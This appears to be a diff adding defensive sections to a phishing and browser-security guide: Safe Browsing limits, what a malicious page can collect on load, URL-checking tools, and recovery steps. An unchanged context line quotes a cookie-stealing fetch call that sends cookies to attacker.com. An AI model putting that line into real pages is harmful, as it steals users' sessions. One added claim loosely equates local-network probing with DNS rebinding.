@@ -143,6 +143,28 @@ fetch('https://attacker.com/steal?cookies=' + btoa(cookies));
 
 Outdated Chrome versions may be vulnerable to drive-by attacks that execute code without your interaction. These exploits target JavaScript engine vulnerabilities.
 
+## How Chrome Safe Browsing Works (and Where It Fails)
+
+Chrome's Safe Browsing system checks URLs against Google's constantly updated database of known phishing and malware sites. When you navigate to a URL, Chrome sends a hashed version of the address to Google's servers and receives a verdict. If the site is flagged, you'll see a red interstitial warning before the page loads.
+
+The limitation is timing. A newly registered phishing domain typically has a window of 30 minutes to several hours before it appears in the Safe Browsing database. Attackers know this and design their campaigns around rapid deployment and short operational windows — send the phishing email, harvest credentials for a few hours, abandon the domain before it gets flagged.
+
+Enhanced Safe Browsing mode (available in Chrome settings under Privacy and Security) checks in real time rather than relying solely on a local cached list. It shares more data with Google but catches significantly more threats before they load. For most users, enabling Enhanced Safe Browsing is the single highest-value configuration change available.
+
+## What Attackers Can Access Without You Entering Anything
+
+Many users assume a phishing link is only dangerous if they enter their credentials on the fake page. This is incorrect. The moment the page loads and JavaScript executes, several things can happen without any user action:
+
+**Browser fingerprinting:** The phishing page can record your user agent, screen resolution, installed fonts, WebGL capabilities, and time zone. This data is used to track you across sessions and sold to data brokers or used in targeted attacks.
+
+**Cookie access:** Any cookies not protected by the HttpOnly flag are readable by JavaScript. This includes session tokens for sites you visited earlier in the same browser session if those sites failed to set HttpOnly correctly.
+
+**Redirect chains:** The initial URL may immediately redirect through multiple domains, each dropping a tracking pixel or cookie before landing on the final payload. By the time you see a warning and close the tab, several tracking operations have already completed.
+
+**Resource loading attacks:** The page can attempt to load resources from your local network (10.x.x.x, 192.168.x.x addresses) to map your internal network topology — a technique called DNS rebinding.
+
+Closing the tab quickly after realizing you've clicked a phishing link genuinely helps limit exposure. The less JavaScript executes, the fewer data points the attacker collects.
+
 ## Prevention Strategies for Developers
 
 ### Implement Content Security Policy
@@ -183,6 +205,18 @@ Always enable 2FA on critical accounts. Even if credentials are compromised, att
 
 Password managers like 1Password or Bitwarden only fill credentials on domains matching their records. Phishing domains won't match, preventing accidental credential entry.
 
+## How to Analyze a Suspicious URL Before Clicking
+
+When you receive a link you're uncertain about, several tools allow safe analysis without loading it in your browser:
+
+**VirusTotal (virustotal.com):** Paste any URL and VirusTotal checks it against 90+ security engines simultaneously. A clean result does not guarantee safety on new domains but flags the majority of known phishing infrastructure.
+
+**Google Safe Browsing Transparency Report:** Navigate to transparencyreport.google.com/safe-browsing/search and enter the domain. This shows you exactly what Google's Safe Browsing database currently thinks of the site.
+
+**URLScan.io:** This service loads the URL in a sandboxed browser and gives you a full screenshot, list of loaded resources, network requests made, and a risk score — without you ever loading the page directly. It is especially useful for understanding what a phishing page actually does.
+
+**Whois lookup:** A domain registered within the last 48-72 hours sending you an urgent account security email is almost certainly a phishing attempt. Check registration date at whois.domaintools.com.
+
 ## Checking If Your Credentials Were Compromised
 
 After an incident, verify your account security:
@@ -192,6 +226,16 @@ After an incident, verify your account security:
 3. Enable alerts for suspicious activity
 4. Change passwords for affected accounts immediately
 5. Rotate API keys and tokens if you use browser-based tools
+
+## Recovering from a Successful Phishing Attack
+
+If you entered credentials on a phishing page, time is the critical variable. Attackers often use automated systems that attempt account access within seconds of credential submission. The following steps should be executed as fast as possible, ideally in parallel across multiple devices:
+
+1. **Change the compromised account password immediately** — use a device you trust (your phone on cellular data if you suspect your primary machine is compromised)
+2. **Revoke all active sessions** — most major services offer a "sign out of all devices" option in security settings; use it
+3. **Enable 2FA if not already active** — this is the most effective lock-out measure even for already-compromised credentials
+4. **Check for unauthorized changes** — look at email forwarding rules, account recovery phone numbers/emails, and connected third-party apps
+5. **Notify your organization's security team** — if the phishing involved a work account, this is not optional
 
 ## Building Detection into Your Applications
 
